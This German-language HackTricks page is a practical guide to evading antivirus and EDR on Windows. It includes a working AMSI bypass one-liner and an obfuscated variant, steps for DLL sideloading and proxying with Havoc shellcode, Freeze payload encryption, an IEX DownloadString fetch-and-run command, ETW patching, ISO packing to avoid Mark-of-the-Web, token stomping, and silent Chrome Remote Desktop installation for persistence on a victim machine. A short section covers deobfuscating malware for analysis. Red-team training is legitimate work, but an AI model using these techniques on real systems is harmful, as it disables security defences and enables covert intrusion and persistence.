# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Diese Seite wurde geschrieben von** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Stop Defender

- [defendnot](https://github.com/es3n1n/defendnot): Ein Tool, um Windows Defender außer Betrieb zu setzen.
- [no-defender](https://github.com/es3n1n/no-defender): Ein Tool, das Windows Defender stoppt, indem es ein anderes AV vortäuscht.
- [Defender deaktivieren, wenn Sie Admin sind](basic-powershell-for-pentesters/README.md)

## **AV Evasion Methodology**

Derzeit nutzen AVs verschiedene Methoden, um zu prüfen, ob eine Datei bösartig ist oder nicht: static detection, dynamic analysis und – bei fortgeschritteneren EDRs – behavioural analysis.

### **Static detection**

Static detection erfolgt, indem bekannte bösartige Strings oder Bytefolgen in einer Binary oder einem Script markiert werden und zusätzlich Informationen aus der Datei selbst extrahiert werden (z. B. file description, company name, digital signatures, icon, checksum, etc.). Das bedeutet, dass die Nutzung bekannter öffentlicher Tools dich leichter erwischen kann, da diese vermutlich bereits analysiert und als bösartig markiert wurden. Es gibt ein paar Möglichkeiten, diese Art der Erkennung zu umgehen:

- **Encryption**
  Wenn du die Binary verschlüsselst, gibt es für AV keine Möglichkeit, dein Programm zu erkennen, aber du brauchst einen Loader, um das Programm im Speicher zu entschlüsseln und auszuführen.

- **Obfuscation**
  Manchmal genügt es, einige Strings in deiner Binary oder deinem Script zu ändern, um an AV vorbeizukommen. Je nach Umfang kann das jedoch zeitaufwändig sein.

- **Custom tooling**
  Wenn du eigene Tools entwickelst, existieren keine bekannten schlechten Signaturen, aber das erfordert viel Zeit und Aufwand.

> [!TIP]
> Eine gute Möglichkeit, Windows Defender's static detection zu überprüfen, ist [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Es teilt die Datei in mehrere Segmente und veranlasst Defender, jedes einzelne zu scannen; so kann es dir genau zeigen, welche Strings oder Bytes in deiner Binary markiert werden.

Ich empfehle dringend, dir diese [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) über praktische AV Evasion anzusehen.

### **Dynamic analysis**

Dynamic analysis ist, wenn das AV deine Binary in einer sandbox ausführt und auf bösartige Aktivitäten achtet (z. B. versuchen, Browser-Passwörter zu entschlüsseln und zu lesen, ein minidump auf LSASS zu erstellen, etc.). Dieser Teil kann etwas kniffliger sein, aber hier sind einige Dinge, die du tun kannst, um Sandboxes zu umgehen.

- **Sleep before execution** Je nach Implementierung kann das eine gute Methode sein, AVs dynamic analysis zu umgehen. AVs haben nur sehr wenig Zeit, Dateien zu scannen, um den Benutzer-Workflow nicht zu unterbrechen, daher können lange Sleeps die Analyse stören. Das Problem ist, dass viele AV-Sandboxes den Sleep je nach Implementierung einfach überspringen können.
- **Checking machine's resources** Normalerweise haben Sandboxes nur sehr wenige Ressourcen (z. B. < 2GB RAM), sonst würden sie den Rechner des Nutzers verlangsamen. Hier kannst du kreativ sein, z. B. durch Abfragen der CPU-Temperatur oder sogar der Lüfterdrehzahl — nicht alles wird in der Sandbox implementiert sein.
- **Machine-specific checks** Wenn du einen Benutzer anvisierst, dessen Workstation an die Domain "contoso.local" angebunden ist, kannst du die Computer-Domain prüfen; wenn sie nicht übereinstimmt, kannst du dein Programm beenden.

Es stellt sich heraus, dass der Computername der Microsoft Defender-Sandbox HAL9TH ist. Du kannst also vor der Detonation in deiner Malware den Computernamen prüfen: Wenn er HAL9TH lautet, befindest du dich in Defenders Sandbox, und du kannst dein Programm beenden.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>Quelle: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Ein paar weitere sehr gute Tipps von [@mgeeky](https://twitter.com/mariuszbit) zum Umgehen von Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Wie bereits weiter oben in diesem Beitrag gesagt: **public tools** werden früher oder später **entdeckt**, also solltest du dir Folgendes fragen:

Beispielsweise: Wenn du LSASS dumpen willst, **musst du wirklich mimikatz verwenden**? Oder könntest du ein anderes, weniger bekanntes Projekt verwenden, das ebenfalls LSASS dumpen kann?

Die richtige Antwort ist wahrscheinlich Letzteres. Anhand von mimikatz: Es ist wahrscheinlich eines der — wenn nicht das am meisten — geflaggten Stücke "Malware" durch AVs und EDRs; obwohl das Projekt an sich super ist, ist es ein Albtraum, damit AVs zu umgehen. Such also nach Alternativen für das, was du erreichen willst.

> [!TIP]
> Wenn du deine Payloads zur Evasion modifizierst, stelle sicher, dass du die automatische Sample-Übermittlung in defender deaktivierst, und bitte — ernsthaft — **DO NOT UPLOAD TO VIRUSTOTAL**, wenn dein Ziel langfristige Evasion ist. Wenn du prüfen willst, ob deine Payload von einem bestimmten AV erkannt wird, installiere das AV in einer VM, versuche die automatische Sample-Übermittlung auszuschalten und teste dort, bis du mit dem Ergebnis zufrieden bist.

## EXEs vs DLLs

Wann immer möglich, priorisiere die Verwendung von DLLs für Evasion. Meiner Erfahrung nach werden DLL-Dateien in der Regel deutlich seltener erkannt und analysiert, daher ist es ein sehr einfacher Trick, um in manchen Fällen Erkennung zu vermeiden (sofern dein Payload natürlich als DLL ausgeführt werden kann).

Wie in diesem Bild zu sehen ist, hat ein DLL Payload von Havoc eine Erkennungsrate von 4/26 bei antiscan.me, während der EXE-Payload eine Erkennungsrate von 7/26 hat.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Nun zeigen wir einige Tricks, die du mit DLL-Dateien nutzen kannst, um deutlich unauffälliger zu sein.

## DLL Sideloading & Proxying

DLL Sideloading nutzt die DLL-Suchreihenfolge des Loaders aus, indem die Opferanwendung und die bösartigen Payload(s) nebeneinander platziert werden.

Du kannst Programme, die für DLL Sideloading anfällig sind, mit [Siofra](https://github.com/Cybereason/siofra) und dem folgenden powershell script überprüfen:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Dieser Befehl gibt die Liste der Programme aus, die für DLL hijacking innerhalb von "C:\Program Files\\" anfällig sind, sowie die DLL-Dateien, die sie zu laden versuchen.

Ich empfehle dringend, dass du **DLL Hijackable/Sideloadable programs selbst erkundest**, diese Technik ist bei korrekter Anwendung ziemlich unauffällig, aber wenn du öffentlich bekannte DLL Sideloadable programs verwendest, kannst du leicht entdeckt werden.

Allein dadurch, eine bösartige DLL mit dem Namen abzulegen, den ein Programm zu laden erwartet, lädt das Programm nicht automatisch dein payload, da es bestimmte Funktionen in dieser DLL erwartet. Um dieses Problem zu beheben, verwenden wir eine andere Technik namens **DLL Proxying/Forwarding**.

**DLL Proxying** leitet die Aufrufe, die ein Programm an die Proxy-(und bösartige) DLL macht, an die originale DLL weiter, wodurch die Funktionalität des Programms erhalten bleibt und die Ausführung deines payloads möglich wird.

Ich werde das Projekt [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) von [@flangvik](https://twitter.com/Flangvik/) verwenden.

Das sind die Schritte, die ich befolgt habe:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Der letzte Befehl liefert uns 2 Dateien: eine DLL-Quellcodevorlage und die ursprüngliche, umbenannte DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Sowohl unser shellcode (kodiert mit [SGN](https://github.com/EgeBalci/sgn)) als auch die proxy DLL haben eine 0/26 Detection rate in [antiscan.me](https://antiscan.me)! Das würde ich als Erfolg bezeichnen.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ich **empfehle dringend**, dass du dir [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) über DLL Sideloading ansiehst und auch [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE), um mehr über das, was wir eingehender besprochen haben, zu erfahren.

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Du kannst Freeze verwenden, um deinen shellcode auf unauffällige Weise zu laden und auszuführen.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion ist nur ein Katz-und-Maus-Spiel — was heute funktioniert, kann morgen entdeckt werden. Verlasse dich also niemals nur auf ein Tool; wenn möglich, versuche, mehrere evasion techniques zu verketten.

## AMSI (Anti-Malware Scan Interface)

AMSI wurde entwickelt, um "fileless malware" zu verhindern. Anfangs konnten AVs nur **Dateien auf der Festplatte** scannen, daher konnte ein Payload, der **direkt im Arbeitsspeicher** ausgeführt wurde, nicht erkannt werden, weil der AV nicht genug Sichtbarkeit hatte.

Die AMSI-Funktion ist in folgende Windows-Komponenten integriert:

- User Account Control, oder UAC (Elevation von EXE-, COM-, MSI- oder ActiveX-Installationen)
- PowerShell (Skripte, interaktive Nutzung und dynamische Codeauswertung)
- Windows Script Host (wscript.exe und cscript.exe)
- JavaScript und VBScript
- Office VBA macros

Sie erlaubt Antivirus-Lösungen, das Verhalten von Skripten zu inspizieren, indem Skriptinhalte in einer unverschlüsselten und nicht-obfuskierten Form offengelegt werden.

Das Ausführen von `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` erzeugt die folgende Meldung in Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Beachte, wie es `amsi:` voranstellt und dann den Pfad zur ausführbaren Datei angibt, von der das Skript ausgeführt wurde — in diesem Fall powershell.exe.

Wir haben keine Datei auf die Festplatte geschrieben, wurden aber trotzdem wegen AMSI im Arbeitsspeicher erkannt.

Außerdem wird seit **.NET 4.8** auch C#-Code durch AMSI geprüft. Das betrifft sogar `Assembly.Load(byte[])` für in-memory-Ausführung. Deshalb wird empfohlen, bei In-Memory-Ausführung niedrigere .NET-Versionen (z. B. 4.7.2 oder älter) zu verwenden, wenn man AMSI umgehen möchte.

Es gibt ein paar Möglichkeiten, AMSI zu umgehen:

- **Obfuscation**

Da AMSI hauptsächlich mit statischen Erkennungen arbeitet, kann das Modifizieren der Skripte, die du zu laden versuchst, eine gute Methode sein, um die Erkennung zu umgehen.

AMSI hat jedoch die Fähigkeit, Skripte zu deobfuskieren, selbst wenn mehrere Schichten vorhanden sind, sodass Obfuskation je nach Ausführung eine schlechte Option sein kann. Das macht das Umgehen nicht so trivial. Manchmal reicht jedoch schon, ein paar Variablennamen zu ändern, und alles ist gut — es hängt also davon ab, wie stark etwas markiert wurde.

- **AMSI Bypass**

Da AMSI durch das Laden einer DLL in den powershell- (ebenfalls cscript.exe, wscript.exe etc.) Prozess implementiert ist, ist es möglich, diese DLL selbst als nicht-privilegierter Benutzer zu manipulieren. Aufgrund dieses Implementierungsfehlers haben Forscher mehrere Wege gefunden, AMSI-Scans zu umgehen.

Erzwingen eines Fehlers

Das Erzwingen eines Fehlschlags der AMSI-Initialisierung (amsiInitFailed) hat zur Folge, dass für den aktuellen Prozess kein Scan gestartet wird. Ursprünglich wurde dies von [Matt Graeber](https://twitter.com/mattifestation) offengelegt und Microsoft hat eine Signatur entwickelt, um eine breitere Nutzung zu verhindern.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Es brauchte nur eine Zeile powershell-Code, um AMSI für den aktuellen powershell-Prozess unbrauchbar zu machen. Diese Zeile wurde natürlich von AMSI selbst markiert, daher sind einige Anpassungen nötig, um diese Technik nutzen zu können.

Hier ist ein modifizierter AMSI bypass, den ich aus diesem [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) übernommen habe.
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Beachte, dass dies wahrscheinlich als verdächtig markiert wird, sobald dieser Beitrag veröffentlicht ist, daher solltest du keinen Code veröffentlichen, wenn dein Ziel ist, unentdeckt zu bleiben.

**Memory Patching**

Diese Technik wurde ursprünglich von [@RastaMouse](https://twitter.com/_RastaMouse/) entdeckt und beinhaltet das Finden der Adresse der Funktion "AmsiScanBuffer" in amsi.dll (verantwortlich für das Scannen der vom Benutzer bereitgestellten Eingaben) und das Überschreiben dieser mit Anweisungen, die den Rückgabewert E_INVALIDARG liefern. Auf diese Weise gibt der eigentliche Scan 0 zurück, was als sauber interpretiert wird.

> [!TIP]
> Bitte lies [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) für eine ausführlichere Erklärung.

Es gibt außerdem viele andere Techniken, um AMSI mit PowerShell zu umgehen — schau dir [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) und [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) an, um mehr darüber zu erfahren.

Dieses Tool [**https://github.com/Flangvik/AMSI.fail**](https://github.com/Flangvik/AMSI.fail) generiert ebenfalls Skripte zur Umgehung von AMSI.

**Entfernen der erkannten Signatur**

Du kannst ein Tool wie **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** und **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** verwenden, um die erkannte AMSI-Signatur aus dem Speicher des aktuellen Prozesses zu entfernen. Dieses Tool arbeitet, indem es den Speicher des aktuellen Prozesses nach der AMSI-Signatur scannt und diese anschließend mit NOP-Instruktionen überschreibt, wodurch sie effektiv aus dem Speicher entfernt wird.

**AV/EDR-Produkte, die AMSI verwenden**

Eine Liste von AV/EDR-Produkten, die AMSI verwenden, findest du in **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

PowerShell Version 2 verwenden
Wenn du PowerShell Version 2 verwendest, wird AMSI nicht geladen, sodass du deine Skripte ausführen kannst, ohne von AMSI gescannt zu werden. Du kannst dies wie folgt tun:
```bash
powershell.exe -version 2
```
## PS-Logging

PowerShell-Logging ist eine Funktion, die es erlaubt, alle auf einem System ausgeführten PowerShell-Befehle zu protokollieren. Das kann nützlich für Audits und Troubleshooting sein, aber es kann auch ein Problem für Angreifer sein, die Erkennung umgehen wollen.

Um PowerShell-Logging zu umgehen, können Sie folgende Techniken verwenden:

- **Disable PowerShell Transcription and Module Logging**: Sie können dafür ein Tool wie [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) verwenden.
- **Use Powershell version 2**: Wenn Sie PowerShell Version 2 verwenden, wird AMSI nicht geladen, sodass Sie Ihre Skripte ausführen können, ohne von AMSI gescannt zu werden. Beispiel: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Nutzen Sie [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) um eine PowerShell-Session ohne Verteidigungen zu starten (das ist das, was `powerpick` aus Cobalt Strike verwendet).


## Obfuscation

> [!TIP]
> Mehrere Obfuscation-Techniken basieren auf der Verschlüsselung von Daten, was die Entropie der Binary erhöht und AVs/EDRs das Erkennen erleichtert. Seien Sie vorsichtig damit und verschlüsseln Sie ggf. nur spezifische, sensitive Abschnitte Ihres Codes.

### Deobfuscation von ConfuserEx-geschützten .NET-Binaries

Bei der Analyse von Malware, die ConfuserEx 2 (oder kommerzielle Forks) verwendet, trifft man häufig auf mehrere Schutzschichten, die Decompiler und Sandboxes blockieren. Der folgende Workflow stellt zuverlässig ein nahezu originales IL wieder her, das anschließend in Tools wie dnSpy oder ILSpy nach C# dekompiliert werden kann.

1.  Anti-Tampering-Entfernung – ConfuserEx verschlüsselt jeden *method body* und entschlüsselt ihn im statischen Konstruktor des *Modules* (`<Module>.cctor`). Das patched außerdem die PE-Checksum, sodass jede Modifikation die Binary zum Absturz bringen kann. Verwenden Sie **AntiTamperKiller**, um die verschlüsselten Metadaten-Tabellen zu lokalisieren, die XOR-Keys wiederherzustellen und ein sauberes Assembly zu schreiben:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Die Ausgabe enthält die 6 Anti-Tamper-Parameter (`key0-key3`, `nameHash`, `internKey`), die beim Erstellen eines eigenen Unpackers nützlich sein können.

2.  Symbol- / Control-Flow-Wiederherstellung – geben Sie die *clean*-Datei an **de4dot-cex** (ein ConfuserEx-bewusster Fork von de4dot):
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – wählt das ConfuserEx 2 Profil  
• de4dot macht Control-Flow-Flattening rückgängig, stellt originale Namespaces, Klassen- und Variablennamen wieder her und entschlüsselt konstante Strings.

3.  Proxy-Call-Entfernung – ConfuserEx ersetzt direkte Methodenaufrufe durch leichte Wrapper (sog. *proxy calls*), um die Dekompilierung zusätzlich zu erschweren. Entfernen Sie diese mit **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Nach diesem Schritt sollten Sie normale .NET-APIs wie `Convert.FromBase64String` oder `AES.Create()` anstelle undurchsichtiger Wrapper-Funktionen (`Class8.smethod_10`, …) sehen.

4.  Manueller Clean-up – führen Sie die resultierende Binary in dnSpy aus, suchen Sie nach großen Base64-Blobs oder der Verwendung von `RijndaelManaged`/`TripleDESCryptoServiceProvider`, um das *echte* Payload zu finden. Oft speichert die Malware es als TLV-codiertes Byte-Array, initialisiert innerhalb von `<Module>.byte_0`.

Die obige Kette stellt den Ausführungsfluss **ohne** Ausführen des bösartigen Samples wieder her — nützlich, wenn man auf einem Offline-Arbeitsplatz arbeitet.

> 🛈  ConfuserEx erzeugt ein Custom Attribute namens `ConfusedByAttribute`, das als IOC verwendet werden kann, um Samples automatisch zu triagieren.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Ziel dieses Projekts ist es, einen Open-Source-Fork der [LLVM](http://www.llvm.org/) Kompilierungs-Suite bereitzustellen, der erhöhte Softwaresicherheit durch [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) und Manipulationsschutz bietet.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstriert, wie man die Sprache `C++11/14` verwendet, um zur Compile-Zeit obfuskierten Code zu erzeugen, ohne ein externes Tool zu nutzen und ohne den Compiler zu verändern.
- [**obfy**](https://github.com/fritzone/obfy): Fügt eine Schicht obfuskierter Operationen hinzu, die vom C++ Template-Metaprogramming-Framework erzeugt werden und das Leben der Person, die die Anwendung knacken möchte, etwas erschweren.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz ist ein x64-Binärobfuscator, der verschiedene PE-Dateien obfuskieren kann, darunter: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame ist eine einfache metamorphe Code-Engine für beliebige Executables.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator ist ein feingranulares Code-Obfuskations-Framework für LLVM-unterstützte Sprachen, das ROP (return-oriented programming) verwendet. ROPfuscator obfuskiert ein Programm auf Assembly-Ebene, indem reguläre Instruktionen in ROP-Ketten verwandelt werden, wodurch unsere gewohnte Vorstellung von normalem Kontrollfluss untergraben wird.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt ist ein .NET PE Crypter geschrieben in Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor kann existierende EXE/DLL in shellcode konvertieren und diese dann laden

## SmartScreen & MoTW

You may have seen this screen when downloading some executables from the internet and executing them.

Microsoft Defender SmartScreen is a security mechanism intended to protect the end user against running potentially malicious applications.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen mainly works with a reputation-based approach, meaning that uncommonly download applications will trigger SmartScreen thus alerting and preventing the end user from executing the file (although the file can still be executed by clicking More Info -> Run anyway).

**MoTW** (Mark of The Web) is an [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) with the name of Zone.Identifier which is automatically created upon download files from the internet, along with the URL it was downloaded from.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Überprüfung des Zone.Identifier ADS für eine aus dem Internet heruntergeladene Datei.</p></figcaption></figure>

> [!TIP]
> Es ist wichtig zu beachten, dass ausführbare Dateien, die mit einem **vertrauenswürdigen** Signaturzertifikat signiert sind, **SmartScreen nicht auslösen**.

A very effective way to prevent your payloads from getting the Mark of The Web is by packaging them inside some sort of container like an ISO. This happens because Mark-of-the-Web (MOTW) **cannot** be applied to **non NTFS** volumes.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) is a tool that packages payloads into output containers to evade Mark-of-the-Web.

Beispielhafte Verwendung:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) ist ein leistungsfähiger Logging-Mechanismus in Windows, der es Anwendungen und Systemkomponenten ermöglicht, **Ereignisse zu protokollieren**. Er kann jedoch auch von Sicherheitsprodukten verwendet werden, um bösartige Aktivitäten zu überwachen und zu erkennen.

Ähnlich wie AMSI deaktiviert (umgangen) werden kann, ist es auch möglich, die Funktion **`EtwEventWrite`** des User-Space-Prozesses so zu verändern, dass sie sofort zurückkehrt, ohne Ereignisse zu protokollieren. Dies wird erreicht, indem die Funktion im Speicher gepatcht wird, sodass sie sofort zurückkehrt und damit das ETW-Logging für diesen Prozess effektiv deaktiviert.

You can find more info in **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Das Laden von C#-Binaries im Speicher ist seit einiger Zeit bekannt und ist immer noch eine sehr gute Möglichkeit, Ihre post-exploitation-Tools auszuführen, ohne vom AV entdeckt zu werden.

Da das payload direkt in den Speicher geladen wird, ohne die Festplatte zu berühren, müssen wir uns nur darum kümmern, AMSI für den gesamten Prozess zu patchen.

Die meisten C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) bieten bereits die Möglichkeit, C#-Assemblies direkt im Speicher auszuführen, es gibt jedoch verschiedene Wege, dies zu tun:

- **Fork\&Run**

Es beinhaltet das **Erzeugen eines neuen 'Opfer'-Prozesses**, injiziere deinen post-exploitation bösartigen Code in diesen neuen Prozess, führe deinen bösartigen Code aus und töte nach Abschluss den neuen Prozess. Das hat sowohl Vorteile als auch Nachteile. Der Vorteil der Fork-and-Run-Methode ist, dass die Ausführung **außerhalb** unseres Beacon-Implant-Prozesses stattfindet. Das bedeutet, dass, wenn bei einer post-exploitation-Aktion etwas schiefgeht oder entdeckt wird, die **viel größere Chance** besteht, dass unser **Implant überlebt.** Der Nachteil ist, dass du eine **größere Chance** hast, von **Behavioural Detections** erwischt zu werden.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Dabei wird der post-exploitation bösartige Code **in den eigenen Prozess** injiziert. Auf diese Weise kannst du vermeiden, einen neuen Prozess zu erstellen und von AV gescannt zu werden, aber der Nachteil ist, dass, falls bei der Ausführung deines payloads etwas schiefgeht, die **viel größere Chance** besteht, deinen **Beacon zu verlieren**, da er abstürzen könnte.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Wenn du mehr über das Laden von C#-Assemblies lesen möchtest, sieh dir bitte diesen Artikel an [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) und deren InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Du kannst C#-Assemblies auch **aus PowerShell** laden, siehe [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) und [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Wie in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) vorgeschlagen, ist es möglich, bösartigen Code in anderen Sprachen auszuführen, indem man der kompromittierten Maschine Zugriff auf die Interpreter-Umgebung gewährt, die auf dem vom Angreifer kontrollierten SMB-Share installiert ist.

Durch das Ermöglichen des Zugriffs auf die Interpreter-Binaries und die Umgebung auf dem SMB-Share kannst du **beliebigen Code in diesen Sprachen im Speicher** der kompromittierten Maschine ausführen.

Das Repo gibt an: Defender scannt die Skripte weiterhin, aber durch die Nutzung von Go, Java, PHP usw. haben wir **mehr Flexibilität, statische Signaturen zu umgehen**. Tests mit zufälligen, nicht-obfuskierten Reverse-Shell-Skripten in diesen Sprachen waren erfolgreich.

## TokenStomping

Token stomping ist eine Technik, die es einem Angreifer ermöglicht, **das Access-Token oder ein Sicherheitsprodukt wie ein EDR oder AV zu manipulieren**, wodurch dessen Privilegien reduziert werden, sodass der Prozess nicht beendet wird, aber nicht mehr die Berechtigungen hat, nach bösartigen Aktivitäten zu suchen.

Um dies zu verhindern, könnte Windows **externe Prozesse** daran hindern, Handles auf die Tokens von Sicherheitsprozessen zu erhalten.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Wie in [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) beschrieben, ist es einfach, Chrome Remote Desktop auf einem Opfer-PC zu installieren und es dann zur Übernahme und Aufrechterhaltung der Persistenz zu verwenden:
1. Lade von https://remotedesktop.google.com/ herunter, klicke auf "Set up via SSH", und dann auf die MSI-Datei für Windows, um die MSI-Datei herunterzuladen.
2. Führe den Installer auf dem Opferrechner im Silent-Modus aus (Admin erforderlich): `msiexec /i chromeremotedesktophost.msi /qn`
3. Geh zurück zur Chrome Remote Desktop-Seite und klicke auf Next. Der Assistent wird dich dann zur Autorisierung auffordern; klicke auf den Authorize-Button, um fortzufahren.
4. Führe den angegebenen Parameter mit einigen Anpassungen aus: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Hinweis: der pin-Parameter erlaubt es, den PIN festzulegen, ohne die GUI zu verwenden).


## Advanced Evasion

